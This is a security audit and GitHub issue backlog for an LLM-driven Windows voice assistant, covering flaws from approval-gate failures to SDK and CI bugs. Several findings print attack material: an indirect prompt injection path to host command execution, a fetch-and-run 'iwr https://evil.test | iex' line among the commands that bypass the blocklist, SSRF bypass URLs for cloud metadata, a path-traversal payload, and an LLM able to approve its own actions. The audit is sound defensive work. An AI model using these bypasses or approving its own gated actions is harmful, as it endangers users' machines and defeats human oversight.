# Darius-AI — Wave-2 ECC Deep Audit & GitHub Issues Backlog (35 Verified Issues)

> **Repository:** [`oscarbol09/Darius-AI`](https://github.com/oscarbol09/Darius-AI)  
> **Audited Branch / Commit:** `main` (`4ad8c0a`)  
> **Audit Date:** 2026-11-22  
> **Baseline Verification:** `ruff check .` (0 errors), `ruff format --check .` (166 files), `mypy src/` (system Python: 0 issues; `.venv` Python 3.12 w/ `requirements.txt`: **14 errors across 4 files**), `pytest tests/ -m "not live"` (**1,132 passed, 2 skipped, 7 deselected**).  
> **Non-Duplication Guarantee:** Excludes all Wave-1 tracked issues `#1`–`#17` (`#1`–`#3`, `#9`–`#17` closed; `#4`–`#8` open).  
> **Publication Status:** **24 Non-Critical Issues (`W2-12`–`W2-35`) Published on GitHub as Issues [`#21`](https://github.com/oscarbol09/Darius-AI/issues/21)–[`#44`](https://github.com/oscarbol09/Darius-AI/issues/44)** • **11 Critical Issues (`W2-01`–`W2-11`) RESOLVED & TEST-VERIFIED Internally**.

---

## Executive Severity Matrix

| Severity | Count | Key Categories |
| :--- | :---: | :--- |
| 🔴 **Critical** | 11 (**✅ All 11 Fixed**) | Unattended Indirect Prompt Injection RCE, Broken HITL `ApprovalStore`, Systemic SSRF, Vault Path Traversal, Broken Gemini Live SDK v2.30, Dead Startup Voice Loops & 0-Frame PTT, Hidden `release.yml` Mypy Failures, Stripped `assistant.language` Config, OpenCV NumPy Crash, Dead `TaskScheduler` + Cron Ignored, 64-bit Win32 `ctypes` Overflow |
| 🟠 **High** | 13 | Unmuted Emergency Lockdown, `DeepResearchAgent` `AttributeError` Crash, Witty-Retort Prompt Hijack, Broken `[ACTION:]` Kwargs & Planner `KeyError`, Win32 Unicode/`ctrl+.` Collisions, Shadowed `_CMD_PATTERNS` + Button `TypeError`, Dead `EdgeTTS->SAPI5` Fallback + `id()` Temp Collisions, `sd.play()` Aborting TTS + Missing `CoInitialize`, Cross-Thread Tk Mutation + Import-Time Mutex, `WebcamSentinel`/`AcousticTrigger` Races, `nvidia_nim` KeyError + 25x Saves, Incomplete i18n Wiring, Packaging Layout Mismatch |
| 🟡 **Medium** | 9 | `DialogueStack` Empty-Input Auto-Confirm, `LoopGuard`/`WorkflowDAG` Logic Bugs, `ScreenVision` GDI Leaks & `VisualIntelOCR` Quotes, `windows_commands` Dead `fallback_cmd` & Unchecked Exits, `WebSearchEngine` Wrong DDG Selector & Truncated Cache, Oracle `Kp=0.0`/Formatting/Router Bugs, Unbounded Audio Cache & Timer Drift, Security Scanner Gaps (`github_pat_`, Skill Prompt Injection), Non-Hermetic Tests Wiping Real Keys + `self_test` False PASS |
| 🔵 **Low** | 2 | Wrong `.ico`/`.log` Paths + 60 FPS Capsule Thrashing + Stale Docs JS, `wol_dispatcher` Broadcast Abort + Unescaped YAML Frontmatter + Hardcoded Icon Path |
| **TOTAL** | **35** | **35 `help wanted` • 11 `good first issue`** |

---

## Quick-Reference Issue Index

| ID | Title | Severity | GitHub Labels | Primary Modules |
| :--- | :--- | :---: | :--- | :--- |
| **W2-01** (✅ **FIXED**) | Indirect Prompt Injection via Web/Obsidian Enables Unattended OS Execution & `is_destructive()` Bypass | 🔴 Critical | `security`, `bug`, `help wanted` | `ai_client.py`, `agentic_bridge.py` |
| **W2-02** (✅ **FIXED**) | Broken HITL `ApprovalStore`: Fail-Open Exception, Deadlocked `HIGH` Tier, LLM Self-Approval & Inverted Consent Parsing | 🔴 Critical | `security`, `bug`, `help wanted` | `approval_store.py`, `agentic_bridge.py`, `agent_planner.py`, `app.py` |
| **W2-03** (✅ **FIXED**) | Systemic SSRF Bypasses Across `security_guard.py`, `human_input.py`, `deep_research.py` & `science_oracle.py` | 🔴 Critical | `security`, `bug`, `help wanted` | `security_guard.py`, `human_input.py`, `deep_research.py`, `science_oracle.py` |
| **W2-04** (✅ **FIXED**) | Arbitrary File Write via Path Traversal in `TargetDossierEngine` & Missing Vault Containment in `ObsidianBrain` | 🔴 Critical | `security`, `bug`, `help wanted` | `target_dossier.py`, `obsidian_brain.py` |
| **W2-05** (✅ **FIXED**) | Broken `google-genai` Live SDK Contract (`AsyncSession.send`, Turn-1 Disconnect) & Async Lifecycle Leaks | 🔴 Critical | `bug`, `help wanted` | `gemini_live_engine.py`, `windows_commands.py`, `app.py` |
| **W2-06** (✅ **FIXED**) | Continuous Voice Loops (`start_system`, `main_loop`, `_ptt_loop`) Never Start & PTT Records 0 Frames on Release | 🔴 Critical | `bug`, `help wanted` | `app.py` |
| **W2-07** (✅ **FIXED**) | Release CI (`release.yml` Gate 2) Fails With 14 Mypy Errors + Python 3.12 `numpy` Stub Crash Hidden by PR CI | 🔴 Critical | `bug`, `ci/cd`, `testing`, `help wanted`, `good first issue` | `.github/workflows/*.yml`, `pyproject.toml`, `visualizer.py`, `web_search_engine.py`, `news_sentinel.py`, `deep_research.py` |
| **W2-08** (✅ **FIXED**) | `config_loader._SCHEMA` Silently Strips `assistant.language` & `llm.antigravity_api_key` on Restart (+ `target_dossier` `cfg.get`) | 🔴 Critical | `bug`, `help wanted`, `good first issue` | `config_loader.py`, `byok_settings.py`, `target_dossier.py` |
| **W2-09** (✅ **FIXED**) | `FaceBiometricsEngine.verify_face_frame()` Crashes With `ValueError` on Every Real NumPy Frame + `VideoCapture` Leak | 🔴 Critical | `bug`, `help wanted`, `good first issue` | `face_biometrics.py` |
| **W2-10** (✅ **FIXED**) | `TaskScheduler` Never Executes Tasks (`executor_callback=None`), Ignores `CRON` Expressions & Breaks `ONCE` UTC SQL Comparison | 🔴 Critical | `bug`, `help wanted` | `task_scheduler.py`, `app.py` |
| **W2-11** (✅ **FIXED**) | Missing `ctypes` `argtypes`/`restype` in `workspace_manager.py` Causes 64-bit `HANDLE`/`HWND` Truncation & `OverflowError` | 🔴 Critical | `bug`, `help wanted` | `workspace_manager.py` |
| **W2-12** ([`#21`](https://github.com/oscarbol09/Darius-AI/issues/21)) | Emergency Tactical Silence / Lockdown Unmutes Muted Hosts, Leaves Active TTS Talking & Leaks SQLite Connections | 🟠 High | `bug`, `security`, `help wanted` | `darius_lockdown.py`, `bento_dashboard.py`, `app.py` |
| **W2-13** ([`#22`](https://github.com/oscarbol09/Darius-AI/issues/22)) | Guaranteed `AttributeError` Between `DeepResearchAgent` & `WebSearchEngine` + Divergent Research Subsystems | 🟠 High | `bug`, `refactor`, `help wanted` | `deep_research_agent.py`, `web_search_engine.py`, `deep_research.py` |
| **W2-14** ([`#23`](https://github.com/oscarbol09/Darius-AI/issues/23)) | `get_ai_response()` Witty-Retort Fast-Path Hijacks Normal Queries, Planner JSON, Research Reports & Dossiers | 🟠 High | `bug`, `help wanted`, `good first issue` | `ai_client.py`, `darius_persona.py` |
| **W2-15** ([`#24`](https://github.com/oscarbol09/Darius-AI/issues/24)) | System Prompt `[ACTION: ...]` Kwarg Mismatch in `AgenticBridge` & Broken `AgentPlanner` Contracts (`KeyError: 'summary'`, Stub DAG) | 🟠 High | `bug`, `help wanted` | `ai_client.py`, `agentic_bridge.py`, `agent_planner.py`, `app.py` |
| **W2-16** ([`#25`](https://github.com/oscarbol09/Darius-AI/issues/25)) | Broken Win32 Unicode Typing (`keybd_event`), Hotkey VK Collisions (`ctrl+.` → `Ctrl+Delete`) & Stuck Keys | 🟠 High | `bug`, `help wanted` | `human_input.py` |
| **W2-17** ([`#26`](https://github.com/oscarbol09/Darius-AI/issues/26)) | `_CMD_PATTERNS` Ordering Shadows 4 Local Handlers, `"unmute"` Always Mutes & Volume Buttons Crash With `TypeError` | 🟠 High | `bug`, `help wanted`, `good first issue` | `app.py`, `test_commands_v6.py` |
| **W2-18** ([`#27`](https://github.com/oscarbol09/Darius-AI/issues/27)) | Dead `EdgeTTS -> SAPI5` Fallback, Ignored `rate`/`volume`, `id()` Temp Collisions & `TTSWorker` Echo-Tail Race | 🟠 High | `bug`, `help wanted` | `tts_worker.py`, `edge_tts_engine.py` |
| **W2-19** ([`#28`](https://github.com/oscarbol09/Darius-AI/issues/28)) | Global `sounddevice.play()` Aborts Active TTS on Concurrent SFX & Missing `CoInitialize` Breaks `pycaw` on Worker Threads | 🟠 High | `bug`, `help wanted` | `sound_effects.py`, `media_controller.py`, `elevenlabs_tts_engine.py`, `tts_cache.py` |
| **W2-20** ([`#29`](https://github.com/oscarbol09/Darius-AI/issues/29)) | GUI Lifecycle & Thread-Safety Bugs in `app.py` & `bento_dashboard.py` (Cross-Thread Tk Mutation, Broken Close, Import Mutex, Sync Net I/O) | 🟠 High | `bug`, `performance`, `help wanted` | `app.py`, `bento_dashboard.py` |
| **W2-21** ([`#30`](https://github.com/oscarbol09/Darius-AI/issues/30)) | Concurrency & Lifecycle Races in `AcousticDoubleClapDetector` & `WebcamSentinel` (Orphaned Streams, Stuck `RUNNING`, Camera Contention) | 🟠 High | `bug`, `help wanted` | `acoustic_trigger.py`, `webcam_sentinel.py`, `app.py` |
| **W2-22** ([`#31`](https://github.com/oscarbol09/Darius-AI/issues/31)) | Provider Mismatch (`nvidia_nim` vs `nvidia`) Causes `KeyError` & Silent Gemini Fallback + Modal `TclError` & 25x Config Writes | 🟠 High | `bug`, `help wanted`, `good first issue` | `byok_settings.py`, `ai_client.py` |
| **W2-23** ([`#32`](https://github.com/oscarbol09/Darius-AI/issues/32)) | Incomplete End-to-End Dual-Language i18n Wiring Across `app.py`, `byok_settings.py`, `bento_dashboard.py`, SAPI5 & Oracles | 🟠 High | `enhancement`, `help wanted` | `app.py`, `byok_settings.py`, `bento_dashboard.py`, `ai_client.py`, oracles |
| **W2-24** ([`#33`](https://github.com/oscarbol09/Darius-AI/issues/33)) | Packaging & Installer Defects: `pyproject.toml` Layout Mismatch, Missing Win32 Markers, Personal Template Defaults & Spanish-Only `installer.iss` | 🟠 High | `bug`, `documentation`, `help wanted` | `pyproject.toml`, `requirements.txt`, `config.template.json`, `installer.iss`, `build_nuitka.py` |
| **W2-25** ([`#34`](https://github.com/oscarbol09/Darius-AI/issues/34)) | `DariusDialogueStack` Auto-Confirms Dangerous Actions on Empty/1-Char Noise & Misclassifies `"si"`/`"no"` Substrings | 🟡 Medium | `bug`, `security`, `help wanted`, `good first issue` | `dialogue_stack.py` |
| **W2-26** ([`#35`](https://github.com/oscarbol09/Darius-AI/issues/35)) | `LoopGuard` Ping-Pong/3-Cycle Never Escalates `WARN -> BLOCK` & `WorkflowDAG` Runs Nodes Whose Prerequisites Were Skipped | 🟡 Medium | `bug`, `help wanted`, `good first issue` | `loop_guard.py`, `workflow_dag.py` |
| **W2-27** ([`#36`](https://github.com/oscarbol09/Darius-AI/issues/36)) | `ScreenVisionEngine` Leaks Win32 GDI Handles + `VisualIntelOCR` PowerShell Quote Bug, Handle Leaks & Double Tesseract Execution | 🟡 Medium | `bug`, `performance`, `help wanted` | `screen_vision.py`, `visual_intel_ocr.py` |
| **W2-28** ([`#37`](https://github.com/oscarbol09/Darius-AI/issues/37)) | `windows_commands.py` Dead `fallback_cmd`, Shadowed `return_output` Flags, Ignored Non-Zero Exits & Dummy Python Handlers | 🟡 Medium | `bug`, `help wanted` | `windows_commands.py` |
| **W2-29** ([`#38`](https://github.com/oscarbol09/Darius-AI/issues/38)) | `WebSearchEngine` Wrong DDG Selector (`result__a`), Truncated Cache & Unlocked Mutation + Cache Bugs in Oracles | 🟡 Medium | `bug`, `help wanted`, `good first issue` | `web_search_engine.py`, `news_sentinel.py`, `air_traffic_sentinel.py`, `seismic_sensor.py` |
| **W2-30** ([`#39`](https://github.com/oscarbol09/Darius-AI/issues/39)) | Oracle Parsing & Routing Bugs: `Kp == 0.0` Crash, `"3.704.4"` Formatting, Missing Accent Normalization & Bullet Regex Bug | 🟡 Medium | `bug`, `help wanted`, `good first issue` | `space_weather_oracle.py`, `science_oracle.py`, `lexicon_oracle.py`, `complexity_router.py` |
| **W2-31** ([`#40`](https://github.com/oscarbol09/Darius-AI/issues/40)) | Unbounded `tts_cache` + Thread `.tmp` Race, ElevenLabs Non-PCM Static Corruption & `DariusTimerManager` Drift / 20 Hz Polling | 🟡 Medium | `bug`, `performance`, `help wanted` | `tts_cache.py`, `elevenlabs_tts_engine.py`, `darius_timer.py` |
| **W2-32** ([`#41`](https://github.com/oscarbol09/Darius-AI/issues/41)) | Hardening Gaps in `security_guard.py` (`github_pat_` & Windows Shell Rules), `SkillRegistry` Prompt Injection & `AntigravityAgentBridge` Stream Timeout | 🟡 Medium | `security`, `enhancement`, `help wanted` | `security_guard.py`, `skill_registry.py`, `antigravity_bridge.py`, `ai_client.py` |
| **W2-33** ([`#42`](https://github.com/oscarbol09/Darius-AI/issues/42)) | Non-Hermetic Tests Wipe Real Developer API Keys & Mutate Obsidian Vault + `self_test.py` False `PASS` and Side Effects | 🟡 Medium | `bug`, `testing`, `help wanted`, `good first issue` | `tests/test_byok_providers.py`, `tests/test_config_loader.py`, `tests/conftest.py`, `self_test.py` |
| **W2-34** ([`#43`](https://github.com/oscarbol09/Darius-AI/issues/43)) | GUI Polish, Dead References & Docs Fixes: Wrong `.ico`/`.log` Paths, 60 FPS Capsule Thrashing, `TelemetryBar` Leak & Stale `docs/script.js` | 🔵 Low | `bug`, `documentation`, `performance`, `help wanted`, `good first issue` | `app.py`, `floating_voice_capsule.py`, `telemetry_bar.py`, `bento_dashboard.py`, `docs/script.js` |
| **W2-35** ([`#44`](https://github.com/oscarbol09/Darius-AI/issues/44)) | Network, Diagnostics & Hygiene: `wol_dispatcher` Broadcast Abort & Fake MACs, `darius_protocol` Fake Audio PASS, Unescaped YAML & Hardcoded Icon Path | 🔵 Low | `bug`, `enhancement`, `help wanted`, `good first issue` | `wol_dispatcher.py`, `darius_protocol.py`, `media_controller.py`, `daily_digest.py`, `user_profile_engine.py`, `assets/generate_icon.py`, `ai_client.py` |

---

# 🔴 CRITICAL ISSUES (`W2-01` – `W2-11`)

---

## Issue W2-01: `[SECURITY] Indirect Prompt Injection via Web/Obsidian Content Enables Unattended OS Command Execution & Trivial is_destructive() Bypass`

- **Labels:** `security`, `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/core/ai_client.py` (lines 321–395, 815–860, 883–957)
  - `src/darius_ai/core/agentic_bridge.py` (lines 29–73, 86–207, 304–375)
  - `src/darius_ai/core/deep_research.py` (lines 136, 219)
  - `src/darius_ai/core/deep_research_agent.py` (lines 70, 162)
  - `src/darius_ai/core/target_dossier.py` (line 252)
  - `src/darius_ai/gui/app.py` (lines 2262–2266)

### Description & Root Cause
1. Every internal summarization/synthesis pipeline (`deep_research.py`, `deep_research_agent.py`, `target_dossier.py`, and `_cmd_scrape_web` in `app.py`) calls `get_ai_response()` with untrusted external web content embedded in the prompt. `get_ai_response()` unconditionally injects `[SYSTEM AUTONOMOUS TOOLS & EXECUTION]` via `_build_system_instruction()` and executes `_resolve_agentic_tool_loop()` on the model response. If untrusted web text induces the LLM to emit `[ACTION: execute_powershell(...)]` or `[ACTION: execute_cmd(...)]`, `AgenticBridge` executes it on the host OS.
2. `AgenticBridge.is_destructive()` (`agentic_bridge.py:29-73`) relies on a short keyword blocklist while `execute_powershell` (`line 96`) passes raw strings to `powershell.exe -Command` and `execute_cmd` (`line 119`) passes raw strings to `cmd.exe /c`, neutralizing `shell=False`.
3. `execute_gh` (`line 146`) and `execute_git` (`line 179`) tokenize strings using naive `.split()`, corrupting quoted commit messages, PR titles, and `--jq` filters.

### Verified Reproduction / Evidence
Empirically verified `is_destructive(...) == False` for:
- PowerShell: `ri C:\temp\file`, `iwr https://evil.test | iex`, `powershell -enc ...`, `Set-Content`, `Start-Process`, and backtick-obfuscated commands.
- CMD: `erase /f ...`, `rd /s`, `taskkill /f`, `certutil`, `bitsadmin`, `mshta`, `rundll32`, and `&` / `|` chaining.
- Git / GH: `git push -f`, `git clean -fd`, `git -c core.sshCommand=...`, `gh auth token`, `gh api -X POST`, `gh secret set`.

### Proposed Fix
1. Add `enable_tools: bool = False` (or `False` default for internal callers) to `get_ai_response()`; omit tool-calling instructions and skip `_resolve_agentic_tool_loop()` when `enable_tools=False`.
2. Replace arbitrary `execute_powershell` / `execute_cmd` string execution with strictly allowlisted parameterized actions + mandatory HITL confirmation.
3. Parse `git` / `gh` arguments with `shlex.split` and enforce an explicit subcommand/flag allowlist.

### Acceptance Criteria
- [ ] Internal research, dossier, and web scraping summarization calls run with `enable_tools=False`.
- [ ] Arbitrary PowerShell/CMD command strings cannot bypass approval via aliases, flags, or chaining.
- [ ] `git` and `gh` argument parsing uses `shlex.split` with quoted-argument regression tests.

---

## Issue W2-02: `[SECURITY] Broken HITL ApprovalStore: Fail-Open Exception, Deadlocked HIGH Tier, LLM Self-Approval, and Inverted Consent Parsing`

- **Labels:** `security`, `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/core/approval_store.py` (lines 55–77, 167–190, 230–236)
  - `src/darius_ai/core/agentic_bridge.py` (lines 334–360)
  - `src/darius_ai/core/agent_planner.py` (lines 79–82, 382–390, 448–464, 530–537)
  - `src/darius_ai/gui/app.py` (lines 2549–2569)

### Description & Root Cause
1. **Fail-open on error (`agentic_bridge.py:359-360`):** Exceptions raised by `ApprovalStore` are caught, logged as warnings, and execution **falls through to execute the destructive tool** (lines 362–643) without approval.
2. **Deadlocked `HIGH` tier (`approval_store.py:173-174, 230-236`):** `RiskTier.HIGH` unconditionally returns `Decision.ASK` without consulting `permission_memory` or `pending_actions`, and `resolve_action()` updates status to `'approved'` without persisting a one-shot consumable permission or executing the tool. An approved `HIGH` action cannot complete.
3. **LLM self-approval & bypassed `confirm=True` (`agent_planner.py`):** Exposes `approval_status(action="resolve", decision="approve")` as an LLM-callable planner tool (`lines 448-464`), enabling autonomous plans to approve their own queued actions; `windows_action` (`lines 382-390`) runs `SYSTEM_ACTIONS` with `"confirm": True` (e.g., `desactivar firewall`, `vaciar papelera`, `hibernar equipo`, `cerrar sesion`) without checking `ApprovalStore`, and `darius_lockdown` (`lines 530-537`) locks the workstation without confirmation.
4. **Inverted consent parsing (`approval_store.py:72-75`, `app.py:2551-2569`):** `APPROVE` is checked before `DENY` via raw substring `in` matching (`"si"`, `"ok"`, `"aprobar"`, `"approve"`).

### Verified Reproduction / Evidence
Empirically verified:
- `parse_approval_response("no aprobar")` → `(None, Decision.APPROVE)`
- `parse_approval_response("do not approve")` → `(None, Decision.APPROVE)`
- `parse_approval_response("no, imposible")` (`"si"` inside `"imposible"`) → `(None, Decision.APPROVE)`
- `parse_approval_response("no, cancelar sesion")` (`"si"` inside `"sesion"`) → `(None, Decision.APPROVE)`

### Proposed Fix
1. Fail closed in `agentic_bridge.py` (`return False, "Approval subsystem error"` inside `except`).
2. Add an explicit one-shot approval consumption API for `HIGH`-tier actions once resolved by a human.
3. Remove `action="resolve"` from LLM-exposed tools in `agent_planner.py`, and enforce `entry.get("confirm")` via `ApprovalStore` before executing `SYSTEM_ACTIONS` or `LockWorkStation`.
4. Rewrite `parse_approval_response()` and `_handle_confirmation()` using word-boundary regexes (`\b...\b`), evaluating negations/denials **before** approvals.

### Acceptance Criteria
- [ ] Storage errors fail closed and never execute gated tools.
- [ ] `"no aprobar"`, `"do not approve"`, `"no, imposible"`, and `"no, cancelar sesion"` all parse as `DENY`.
- [ ] LLM planner tools cannot resolve approvals; `HIGH` tier actions support safe one-shot human approval and execution.

---

## Issue W2-03: `[SECURITY] Systemic SSRF Bypasses Across security_guard.py, human_input.py, deep_research.py, and science_oracle.py`

- **Labels:** `security`, `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/core/security_guard.py` (lines 47–61, 104–171)
  - `src/darius_ai/automation/human_input.py` (lines 98–107, 378–402)
  - `src/darius_ai/core/deep_research.py` (lines 106–119)
  - `src/darius_ai/core/science_oracle.py` (lines 156–168)
  - `src/darius_ai/gui/app.py` (lines 2245–2259)

### Description & Root Cause
1. `human_input.py:378-402` (`scrape_web_content`) attaches `SafeRedirectHandler` for redirects, but **never validates the initial URL**. `app.py:2256` calls it directly on user-supplied URLs.
2. `deep_research.py:106-119` (`_fetch_page_content`) calls `urllib.request.urlopen()` directly with no SSRF validation, no redirect guard, and an unbounded `resp.read()` (OOM DoS risk).
3. `security_guard.py:121-127` does not strip trailing dots from FQDNs.
4. `_BLOCKED_CIDRS` (`security_guard.py:47-61`) omits `100.64.0.0/10` (CGNAT/Tailscale/Alibaba metadata), `64:ff9b::/96` (NAT64), `2002::/16` (6to4), `2001::/32` (Teredo), `192.0.0.0/24`, `198.18.0.0/15`, and `240.0.0.0/4`.
5. Every caller leaves `allow_dns_lookup=False`, and `is_safe_url()` is vulnerable to TOCTOU DNS rebinding because `urllib`/`httpx` re-resolve DNS separately.
6. `science_oracle.py:163` interpolates unsanitized `lang` into `https://{lang}.wikipedia.org/...`.

### Verified Reproduction / Evidence
Empirically verified `AntiSSRFValidator.is_safe_url(...)` returns `(True, "")` for:
- `http://localhost./` and `http://metadata.google.internal./`
- `http://100.64.0.1/`
- `http://[64:ff9b::169.254.169.254]/`
- `http://[2002:7f00:0001::1]/`

### Proposed Fix
1. Normalize `hostname.strip().rstrip(".").lower()` and enforce `not addr.is_global` alongside embedded IPv4 checks for NAT64/6to4/Teredo and `100.64.0.0/10`.
2. Centralize HTTP fetching into one SSRF-safe helper that validates initial + redirect URLs, resolves DNS safely, pins sockets to the validated IP (preserving `Host`/SNI), and enforces response byte limits.
3. Validate `lang` in `science_oracle.py` with `re.fullmatch(r"[a-z]{2,3}(?:-[a-z]{2,4})?", lang.lower())`.

### Acceptance Criteria
- [ ] All trailing-dot, CGNAT, NAT64, 6to4, and Teredo URLs are rejected by `AntiSSRFValidator`.
- [ ] `scrape_web_content` and `deep_research._fetch_page_content` enforce initial URL validation and bounded reads.
- [ ] Regression tests cover every bypass vector in `tests/test_security_guard.py`.

---

## Issue W2-04: `[SECURITY] Arbitrary File Write via Path Traversal in TargetDossierEngine.save_to_obsidian() & Missing Vault Containment in ObsidianBrain`

- **Labels:** `security`, `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/core/target_dossier.py` (lines 258, 289–313)
  - `src/darius_ai/core/obsidian_brain.py` (lines 135, 157–158, 221)

### Description & Root Cause
1. `target_dossier.py:300` constructs `relative_path = f"Darius/Dossiers/{dossier.category.capitalize()}/{safe_name}.md"` using unsanitized `dossier.category` (which originates from LLM JSON output at line 258 or planner arguments), writing via `os.path.join(b.vault_path, relative_path)` without containment checks.
2. `safe_name` (`line 299`) fails to block `..`, empty outputs (e.g., `"???"` → `.md`), or reserved Windows DOS device names (`CON`, `NUL`, `PRN`).
3. `obsidian_brain.py:135, 221` constructs `vault / cfg.obsidian_memories_folder` and `vault / cfg.obsidian_daily_notes_folder` with no `resolve().is_relative_to(vault.resolve())` check; an absolute folder setting discards `vault`, writes outside the vault at line 157, and crashes on `filepath.relative_to(vault)` at line 158.

### Verified Reproduction / Evidence
Empirically verified: `category="../../../../Temp"` resolves to `C:\temp\payload.md`, escaping the Obsidian vault to write anywhere on the filesystem.

### Proposed Fix
1. Allowlist `dossier.category` to `{"person", "company", "repository", "topic", "project"}` (defaulting unknown values to `"topic"`).
2. Harden filename sanitization (`..`, empty fallback, Windows reserved names) and verify `full_path.resolve().is_relative_to(vault_root.resolve())` before any `mkdir`/`open` in both `target_dossier.py` and `obsidian_brain.py`.

### Acceptance Criteria
- [ ] Traversal payloads in `category`, `target_name`, or configured vault subfolders are rejected before filesystem writes.
- [ ] Reserved DOS device filenames and empty sanitized names are safely prefixed/normalized.

---

## Issue W2-05: `[BUG] Broken Google GenAI Live SDK Integration & Async Lifecycle in GeminiLiveEngine and windows_commands.py`

- **Labels:** `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/core/gemini_live_engine.py` (lines 65, 162–174, 208–209, 224–261, 270–365, 387–395)
  - `src/darius_ai/system/windows_commands.py` (lines 1777–1797)
  - `src/darius_ai/gui/app.py` (lines 2709–2724)

### Description & Root Cause
1. **`AsyncSession.send(text=...)` `TypeError` (`gemini_live_engine.py:168`):** Inspected installed `google-genai 2.30.1` `AsyncSession.send(self, *, input=None, end_of_turn=False)` — there is no `text` parameter, so `send_text_prompt_async()` always raises `TypeError` and returns `False`.
2. **Disconnects after Turn 1 (`lines 231-261`):** Verified in `google.genai.live.AsyncSession.receive`: `session.receive()` is a **single-turn** generator that `break`s as soon as `turn_complete=True` arrives, hitting `finally: self._set_state(LiveSessionState.DISCONNECTED)` and terminating all worker and audio threads after the very first turn.
3. **Leaked `@asynccontextmanager` (`lines 208-209, 270-276`):** `session_ctx` returned by `client.aio.live.connect(...)` is never stored or exited via `__aexit__()`.
4. **Voice command `asyncio.run` bugs (`windows_commands.py:1784, 1796`):** `gemini_live_start` runs `asyncio.run(live_engine.start_async())`, which cancels `_receive_task` and destroys the event loop the moment `start_async()` returns `True`, while starting zero audio threads; `gemini_live_stop` calls `asyncio.run(live_engine.stop_async())` in a different loop (`RuntimeError`).
5. **Worker event-loop flapping & shutdown leak (`lines 291-365, 387-395`):** Repeated `loop.run_until_complete(asyncio.sleep(0.1))` flips `loop.is_running()` `False` between ticks (dropping mic chunks and causing `stop_live_session` to set `_stop_event` and close the loop without calling `stop_async()`); `playback_buffer` deque is unbounded; `app.py:kill_process()` never stops the live engine.

### Proposed Fix
1. Use `send_client_content(turns=..., turn_complete=end_of_turn)` (or `send_realtime_input(text=text)`).
2. Loop `async for response in session.receive():` inside `while self.is_active() and not stop_requested:`.
3. Store `self._session_ctx` and await `__aexit__` inside `stop_async()`.
4. Have `windows_commands.py` call `live_engine.start_live_session()` and `live_engine.stop_live_session()`.
5. Run a single continuous `loop.run_until_complete(self._worker_main())` until signaled, cap `playback_buffer = collections.deque(maxlen=256)`, and stop the live engine in `app.py:kill_process()`.

### Acceptance Criteria
- [ ] Multi-turn Gemini Live voice and text prompts function cleanly against `google-genai >= 2.30`.
- [ ] Voice commands `gemini_live_start` / `gemini_live_stop` delegate to `start_live_session()` / `stop_live_session()`.
- [ ] Graceful shutdown stops live sessions and exits `_session_ctx` cleanly.

---

## Issue W2-06: `[BUG] Continuous Voice Loops (start_system, main_loop, _ptt_loop) Never Start on Launch & Push-to-Talk Fires on Key Release (0 Frames)`

- **Labels:** `bug`, `help wanted`
- **Affected Files:**
  - `src/darius_ai/gui/app.py` (lines 241–302, 974–975, 1642–1731)

### Description & Root Cause
1. `DariusFinal.start_system()` (`app.py:1642`) has **0 callers** anywhere in `src/` — `__init__` never invokes it, and `self.start_btn` (`line 975`) is aliased to `cyber_top_bar.btn_mute` (28px icon button wired to `toggle_mute`, not `start_system`). Consequently `main_loop()`, `_ptt_loop()`, and `_porcupine_loop()` never start.
2. Inside `_ptt_loop()` (`lines 1694-1699`), `_ptt_capture_and_process()` is spawned inside `elif not key_down and key_was_down:` (on **key release**). Once spawned, `_ptt_capture_and_process` loops `while keyboard.is_pressed(LISTEN_KEY)` (`line 1713`), immediately seeing `False`, capturing `frames == []`, and returning early.
3. Even if called manually, `start_system()` (`line 1655`) calls `_start_audio_level_monitor()` a second time (already invoked at `line 301`), leaking a duplicate PyAudio input stream, and rewrites the 28px mute button text to `"⚡ NÚCLEO ONLINE"`.

### Proposed Fix
1. Start a unified voice listener supervisor thread from `__init__` (dispatched based on `self.listen_mode` so changing modes transitions cleanly).
2. Trigger `_ptt_capture_and_process` on the **key-down** rising edge (`if key_down and not key_was_down:`).
3. Remove the duplicate `_start_audio_level_monitor()` call and separate `start_btn` from `btn_mute`.

### Acceptance Criteria
- [ ] Continuous `NOM`, `AUTO`, and `PTT` listening modes activate reliably at startup without manual clicks.
- [ ] Holding `Right Ctrl` in `PTT` mode captures audio frames until key release.
- [ ] No duplicate PyAudio stream is opened on startup.

---

## Issue W2-07: `[CI/CD] Release Pipeline (release.yml Gate 2) Fails With 14 Real Mypy Errors + Python 3.12 numpy Stub Crash Hidden by PR CI`

- **Labels:** `bug`, `ci/cd`, `testing`, `help wanted`, `good first issue`
- **Affected Files:**
  - `.github/workflows/release.yml` (lines 54, 66–79)
  - `.github/workflows/main_darius-ai.yml` (lines 38–50)
  - `pyproject.toml` (lines 98–103)
  - `src/darius_ai/gui/visualizer.py` (line 106)
  - `src/darius_ai/core/web_search_engine.py` (lines 229–251)
  - `src/darius_ai/core/news_sentinel.py` (lines 485–491)
  - `src/darius_ai/core/deep_research.py` (lines 78–91)

### Description & Root Cause
1. `main_darius-ai.yml` Gate 1 (`quality`) installs only `requirements-dev.txt` (without `requirements.txt`), so `numpy` and `bs4` resolve to `Any` via `ignore_missing_imports = true` and `mypy src/` passes falsely on PRs.
2. `release.yml` Gate 2 (`verify`, Windows 3.11 & 3.12) installs both `requirements.txt` and `requirements-dev.txt` before `mypy src/`. With `[tool.mypy] python_version = "3.11"` (`pyproject.toml:99`), Python 3.12's `numpy>=2.5` stubs fail immediately with:
   `numpy\__init__.pyi:737: error: Type statement is only supported in Python 3.12 and greater [syntax]`.
3. Running `mypy --python-version 3.12 --python-executable .venv\Scripts\python.exe src/` uncovers **14 real typing errors** hidden from PR CI:
   - `visualizer.py:106`: `y3 = cy + np.zeros_like(x)` assigns `ndarray[floating]` (`float32`) to a variable inferred as `ndarray[float64]`.
   - `web_search_engine.py:230,234,237,251`, `news_sentinel.py:487,490,491`, and `deep_research.py:80,81,87,91`: `tag.get("href", "")` in modern `bs4` types as `str | AttributeValueList | None`, causing union errors (and potential runtime crashes if an attribute returns a list).

### Proposed Fix
1. Extract `raw_attr = tag.get("href")` and normalize `raw_href = raw_attr if isinstance(raw_attr, str) else ""` in `web_search_engine.py`, `news_sentinel.py`, and `deep_research.py`.
2. Update `visualizer.py:106` to `np.zeros_like(x, dtype=np.float64)` (or type `y1/y2/y3` explicitly).
